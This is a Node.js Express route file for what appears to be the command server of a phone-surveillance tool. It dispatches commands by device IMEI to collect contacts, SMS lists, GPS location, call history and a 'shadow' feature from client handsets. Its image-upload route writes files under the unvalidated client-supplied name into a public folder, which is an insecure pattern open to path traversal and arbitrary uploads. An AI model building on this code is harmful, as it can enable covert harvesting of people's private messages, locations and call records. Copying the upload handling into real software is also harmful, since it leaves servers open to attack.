var express = require('express');
var router = express.Router();
const sms = require('../command/sms/sms');
const cmd2Clients = require('../command/cmds/command2clients');
const cmdFromClients = require('../command/cmds/commandFromClient');
let formidable = require('formidable');
let fs = require('fs');
let multer = require('multer');
let baseFolder = './public/images'
let filePath = ''

var storage = multer.diskStorage({
  destination: function (req, file, cb) {
    if (!fs.existsSync(baseFolder)) {
      fs.mkdirSync(baseFolder);
    };
    cb(null, baseFolder);
  },//指定硬盘空间的路径，这里可以是任意一个绝对路径，这里为了方便所以写了个相对路径
  filename: function (req, file, cb) {
    console.log(file.originalname);
    filePath = file.originalname;
    cb(null, file.originalname);//指定文件名和扩展名
  }
});//设置用硬盘的存储方法
var upload = multer({ storage: storage });//表示用硬盘的存储方法

/**
 * import all the module
 */
let Contact = require('../command/contacts/contacts');
let Sms = require('../command/sms/sms');
let Gps = require('../command/gps/gps');
let Call = require('../command/call/call');
let Shadow = require('../command/shadow/shadow');

global.cmder = new Map();
global.cmder.set(cmd2Clients.SEND_CONTACTS_LIST, new Contact());
global.cmder.set(cmd2Clients.SEND_SMS_LIST, new Sms());
global.cmder.set(cmd2Clients.SEND_GPS, new Gps());
global.cmder.set(cmd2Clients.SEND_CALLING_HISTORY, new Call());
global.cmder.set(cmd2Clients.SEND_SHADOW, new Shadow());


/* GET home page. */
router.get('/', function (req, res, next) {
  res.render('index', { title: 'Express' });
});

router.post('/command', (req, res, next) => {
  const command = req.body.command;
  let IMEI = req.body.IMEI;
  if (!IMEI) {
    IMEI = '';
  }
  route(command, IMEI, req, res, next);
});

router.post('/upload', upload.single('image'), (req, res, next) => {

  res.json({
    code: 200,
    msg: 'success',
    data: 'localhost:3000/public/images/' + filePath
  })
  // form.parse(req, (error, fields, files) => {
  //   fs.writeFileSync('public/test.png', fs.readFileSync(files.upload.path));
  // })
});

function route(cmd, imei, req, res, next) {
  if (cmd == null) {
    res.json({
      error: 'cmd can not be null'
    });
  } else {
    global.cmder.get(cmd).distribute(imei, req, res, next);
  }
}

module.exports = router;
